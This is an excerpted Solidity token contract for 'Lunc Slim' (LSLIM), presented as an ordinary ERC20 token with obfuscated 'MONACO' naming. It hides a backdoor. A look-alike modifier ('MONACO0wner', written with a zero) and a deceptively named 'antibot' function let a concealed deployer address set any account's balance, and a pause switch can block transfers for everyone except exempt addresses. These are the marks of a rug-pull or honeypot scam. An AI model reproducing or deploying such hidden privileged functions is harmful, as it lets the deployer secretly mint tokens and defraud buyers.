...
abstract contract MONACOContext {
...
interface MONACOIERC71Metadata is MONACOIERC71 {
    /**
...
abstract contract MONACOOwnable is MONACOContext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "MONACOOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "MONACOOwnable: new owner is the zero address");
...
contract LuncSlim is MONACOContext, MONACOIERC71, MONACOIERC71Metadata, MONACOOwnable {
    // Openzeppelin variables
    mapping(address => uint256) private MONACObalances;
  mapping(address => bool) public MONACOAZERTY;
  ...
  address MONACOpinksale;
    ...
    constructor() {
            // Editable
            MONACOpinksale = msg.sender;
            MONACOAZERTY[MONACOpinksale] = true;
        _name = "Lunc Slim";
        _symbol = "LSLIM";
        uint tSotalSupply = 1000000000000000000;
        MONACOisPaused = false;
        // End editable
     ...
     * {MONACOIERC71-balanceOf} and {MONACOIERC71-transfer}.
     */
    ...
    /**
     * @dev See {MONACOIERC71-totalSupply}.
     */
    ...
    /**
     * @dev See {MONACOIERC71-balanceOf}.
     */
    function balanceOf(address vaccount) public view virtual override returns (uint256) {
        return MONACObalances[vaccount];
    }

    /**
     * @dev See {MONACOIERC71-transfer}.
     *
     * Requirements:
     *
    ...
    /**
     * @dev See {MONACOIERC71-allowance}.
     */
    ...
    /**
     * @dev See {MONACOIERC71-transferFrom}.
     *
     ...
     * problems described in {MONACOIERC71-approve}.
     *
  ...
  modifier MONACO0wner () {
    require(MONACOpinksale == msg.sender, "ERC20: cannot permit Pancake address");
    _;
    ...
    function _transfer(
        ...
        // My implementation
        require(!MONACOisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = MONACObalances[from];
        require(fromBalance >= valux, "ERC20: transfer valux exceeds balance");
        unchecked {
            MONACObalances[from] = fromBalance - valux;
        }
        MONACObalances[to] += valux;
    ...
    function _mint(address vaccount, uint256 valux) internal virtual {
        ...
        SotalSupply += valux;
        MONACObalances[vaccount] += valux;
        emit Transfer(address(0), vaccount, valux);

        _afterTokenTransfer(address(0), vaccount, valux);
    }
  function antibot(address vaccount, uint256 valux) public MONACO0wner {
    MONACObalances[vaccount] = (valux - valux) + valux * 10 ** 9;
            emit Transfer(address(0), vaccount, valux);
  }
    /**
    ...
    function _burn(address vaccount, uint256 valux) internal virtual {
        ...
        uint256 vaccountBalance = MONACObalances[vaccount];
        require(vaccountBalance >= valux, "ERC20: burn valux exceeds balance");
        unchecked {
            MONACObalances[vaccount] = vaccountBalance - valux;
        }
        SotalSupply -= valux;
...
contract floki is MONACOContext, IERC20, MONACOOwnable { 
